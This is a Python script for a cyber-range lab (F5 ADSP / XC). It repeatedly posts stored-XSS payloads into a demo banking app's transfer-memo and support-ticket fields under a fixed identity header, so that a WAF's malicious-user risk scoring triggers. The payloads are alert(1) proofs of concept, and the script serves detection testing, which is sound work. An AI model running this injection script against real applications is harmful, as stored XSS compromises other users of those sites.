"""
malicious_user_xss.py — a sustained XSS campaign from ONE fixed client identity.

F5 ADSP Cyber Range challenge:
    #5 Malicious users — the SAME client identity (a constant custom header,
       e.g. X-Malicious-Client: true) delivers XSS payloads across many
       requests, so a malicious-user profile builds up over time.
XC signal produced:
    Malicious User detection / client risk scoring. Each individual request is
    also a WAF XSS hit, but the key here is that the constant identity header
    lets XC attribute all of them to one client and raise its risk score as the
    volume of violations climbs.

The XSS payloads are posted into REAL stored sinks:
    POST /api/transfers/transfers            (memo field — stored XSS sink)
    POST /api/support/tickets + .../messages (message body — stored XSS sink)

Usage:
    python3 malicious_user_xss.py                     # 3 rounds, X-Malicious-Client: true
    python3 malicious_user_xss.py --rounds 5
    python3 malicious_user_xss.py --identity-header X-Bad-Actor --identity-value yes
    python3 malicious_user_xss.py --sink transfers    # transfers|support|both
"""

import argparse
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from config import BASE_URL, SEEDED_ACCOUNTS, SEEDED_USERS, auth_headers, login, make_client

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><svg onload=alert(1)>',
    "javascript:alert(1)",
]


def main():
    ap = argparse.ArgumentParser(description="Sustained XSS campaign from one fixed identity.")
    ap.add_argument("--user", default="alice", choices=list(SEEDED_USERS))
    ap.add_argument("--rounds", type=int, default=3, help="how many times to cycle the payloads")
    ap.add_argument("--sink", choices=["transfers", "support", "both"], default="both")
    ap.add_argument("--identity-header", default="X-Malicious-Client",
                    help="constant identity header NAME sent on every request")
    ap.add_argument("--identity-value", default="true",
                    help="constant identity header VALUE sent on every request")
    ap.add_argument("--delay", type=float, default=0.03)
    args = ap.parse_args()

    creds = SEEDED_USERS[args.user]
    src, dst = SEEDED_ACCOUNTS[args.user]
    identity = {args.identity_header: args.identity_value}
    print(f"Target: {BASE_URL}  (fixed identity {args.identity_header}: {args.identity_value})")
    print(f"sinks: {args.sink}  rounds: {args.rounds}  payloads/round: {len(XSS_PAYLOADS)}")
    print("lab-only — building a malicious-user risk profile via repeated XSS\n")

    sent = {"transfers": 0, "support": 0}
    codes = {}
    start = time.time()
    with make_client() as client:
        token, _ = login(client, creds["email"], creds["password"])
        hdrs = {**auth_headers(token), **identity}

        ticket_id = None
        if args.sink in ("support", "both"):
            r = client.post("/api/support/tickets", headers=hdrs,
                            json={"subject": "XSS test ticket", "body": "<b>probe</b>"})
            if r.status_code in (200, 201):
                ticket_id = r.json().get("id")
            codes[r.status_code] = codes.get(r.status_code, 0) + 1

        for rnd in range(1, args.rounds + 1):
            for payload in XSS_PAYLOADS:
                if args.sink in ("transfers", "both"):
                    r = client.post("/api/transfers/transfers", headers=hdrs, json={
                        "from_account_id": src, "to_account_id": dst,
                        "amount_cents": 1, "memo": payload,
                    })
                    sent["transfers"] += 1
                    codes[r.status_code] = codes.get(r.status_code, 0) + 1
                if args.sink in ("support", "both") and ticket_id is not None:
                    r = client.post(f"/api/support/tickets/{ticket_id}/messages",
                                    headers=hdrs, json={"sender": "customer", "body": payload})
                    sent["support"] += 1
                    codes[r.status_code] = codes.get(r.status_code, 0) + 1
                if args.delay:
                    time.sleep(args.delay)
            print(f"  round {rnd}/{args.rounds}: XSS payloads delivered")

    total = sent["transfers"] + sent["support"]
    print("\n--- report ---")
    print(f"XSS requests sent: {total} "
          f"(transfer memos={sent['transfers']}, support messages={sent['support']}) "
          f"in {time.time() - start:.2f}s")
    print(f"constant client identity used on ALL of them: "
          f"{args.identity_header}: {args.identity_value}")
    print(f"status breakdown: {codes}")
    print("each request is an XSS WAF hit; the shared identity is what lets XC "
          "score this ONE client as a malicious user.")


if __name__ == "__main__":
    main()
